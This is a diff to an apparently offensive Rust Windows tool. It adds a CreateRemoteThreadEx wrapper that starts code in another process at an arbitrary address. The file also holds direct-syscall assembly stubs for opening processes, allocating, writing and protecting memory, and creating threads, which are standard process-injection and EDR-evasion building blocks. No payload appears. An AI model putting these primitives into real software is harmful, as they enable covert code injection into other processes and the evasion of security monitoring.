@@ -9,7 +9,7 @@ use windows::{  core::PWSTR,
                     Foundation::{CloseHandle, HANDLE, HWND, LUID, NTSTATUS}, 
                     Security::{LookupPrivilegeValueW, LUID_AND_ATTRIBUTES, SE_DEBUG_NAME, TOKEN_ACCESS_MASK, TOKEN_ALL_ACCESS, TOKEN_PRIVILEGES, TOKEN_PRIVILEGES_ATTRIBUTES}, 
                     System::{ ProcessStatus::EnumProcesses, 
-                        Threading::{GetCurrentProcessId, QueryFullProcessImageNameW, PROCESS_ACCESS_RIGHTS, PROCESS_NAME_FORMAT, THREAD_ACCESS_RIGHTS, THREAD_ALL_ACCESS}, 
+                        Threading::{CreateRemoteThreadEx, GetCurrentProcessId, QueryFullProcessImageNameW, LPPROC_THREAD_ATTRIBUTE_LIST, LPTHREAD_START_ROUTINE, PROCESS_ACCESS_RIGHTS, PROCESS_NAME_FORMAT, THREAD_ACCESS_RIGHTS, THREAD_ALL_ACCESS}, 
                                     WindowsProgramming::CLIENT_ID}
                 }
 };
@@ -173,26 +173,31 @@ zw_read_virtual_memory:
     mov eax, 0x3F
     syscall
     ret
+    
 nt_write_virtual_memory:
     mov r10, rcx
     mov eax, 0x3A
     syscall
     ret
+
 zw_allocate_virtual_memory:
     mov r10, rcx
     mov eax, 0x18
     syscall
     ret
+
 nt_open_process:
     mov r10, rcx
     mov eax, 0x26
     syscall
     ret
+
 nt_create_thread_ex:
     mov r10, rcx
     mov eax, 0xc2
     syscall
     ret
+
 zw_protect_virtual_memory:
     mov r10, rcx
     mov eax, 0x50
@@ -528,4 +533,21 @@ pub fn nt_virtual_protect_ex(handle: HANDLE, address: CCvoid, size: usize, flags
             false => return Err(status)
         }
     }
+}
+
+pub fn win32_create_thread_ex(handle: HANDLE, address: usize) -> Result<HANDLE, windows::core::Error>{
+    let lpthread_start_routine = LPTHREAD_START_ROUTINE::Some(unsafe { std::mem::transmute(address as *mut std::ffi::c_void) });
+    let null = LPPROC_THREAD_ATTRIBUTE_LIST(null_mut());
+    unsafe {
+         CreateRemoteThreadEx(
+            handle,
+            None,
+            0,
+            lpthread_start_routine,
+            None,
+            0x0,
+            null,
+            None,
+        )
+    } 
 }
